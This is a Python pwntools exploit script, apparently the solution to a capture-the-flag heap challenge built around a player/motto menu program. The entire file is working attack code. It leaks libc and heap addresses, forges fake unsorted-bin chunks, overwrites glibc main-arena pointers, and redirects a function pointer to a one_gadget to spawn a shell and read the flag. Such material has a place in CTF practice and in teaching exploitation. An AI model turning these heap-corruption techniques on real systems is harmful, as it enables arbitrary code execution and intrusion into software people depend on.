#!/bin/env python3

from pwn import *

#
# INIT
#
context(arch='amd64', os='linux')
libc = ELF(os.path.join(os.path.dirname(__file__), 'glibc/libc.so.6'), False)

#
# UTILS
#
one_gadget = 0xebc81


#
# FUNCTIONS
#
def add_player(cat, nick, motto):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(cat).encode())
    io.sendlineafter(b"Nickname: ", nick)
    io.sendlineafter(b"Motto: ", motto)

def remove_player(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())

def show_player(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(idx).encode())

def solve_chall(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(idx).encode())

def edit_motto(idx, motto):
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendlineafter(b"motto: ", motto)

#
# EXPLOIT
#
def exploit(HOST, PORT):
    global io
    io = remote(HOST, PORT)

    add_player(2, b"A"*8, b"MOTTO")
    add_player(2, b"A"*8, b"MOTTO")
    add_player(2, b"B"*8, b"MOTTO")
    remove_player(2)

    add_player(2, b"C"*8, b"MOTTO")

    # Leak libc
    show_player(4)
    io.recvuntil(b"obtained: ")
    libc_leak = int(io.recvline(False))
    io.recvuntil(b"health: [")
    libc_leak += (int(io.recvuntil(b"/", True)) << 32)
    libc.address = libc_leak - 0x21b0d0
    success(f"libc @ {hex(libc.address)}")

    # Leak heap
    add_player(1, b"D"*8, b"GIVEMEHEAPLEAK")
    show_player(6)
    io.recvuntil(b"exploits: ")
    heap_base = int(io.recvline(False)) - 0xf00
    success(f"heap base @ {hex(heap_base)}")

    # Craft fake unsorted bin
    unsorted_arena_ptr = libc.address + 0x21ace0
    payload = b"AAAA" + b"PWNINGINPROGRESS" * 16
    payload += p64(0) + p64(0x421)
    payload += p64(unsorted_arena_ptr) * 2
    edit_motto(1, payload)

    # Next fake size
    payload = b"BBBB" + b"PWNINGINPROGRESS" * 16
    payload += p64(0x420) + p64(0x300)
    edit_motto(3, payload)

    # Overwrite pointers in main arena
    # We have to do multiple writes to avoid '\n' and overwriting of other pointers
    payload = b"A" * 12
    payload += p64(heap_base + 0x3b0)
    payload = payload[:-2]
    edit_motto(4, payload)
    payload = b"A" * 4
    payload += p64(heap_base + 0x3b0)
    payload = payload[:-2]
    edit_motto(4, payload)
    payload = b"AA"
    edit_motto(4, payload)
    payload = b""
    edit_motto(4, payload)

    # Allocate fake chunk and overwrite function pointer with one gadget
    nick = b"P"*0xd4
    nick += p64(libc.address + one_gadget)
    nick += p32(0) + p32(0x004c0064)
    nick += p64(0)
    nick += p64(0x421)
    nick += p64(0)
    nick += p64(0x1)
    add_player(3, nick, b"FAKECHUNK")

    # Trigger one gadget
    solve_chall(1)

    io.sendline(b"cat flag")
    flag = io.recvline().strip().decode()
    io.close()
    return flag


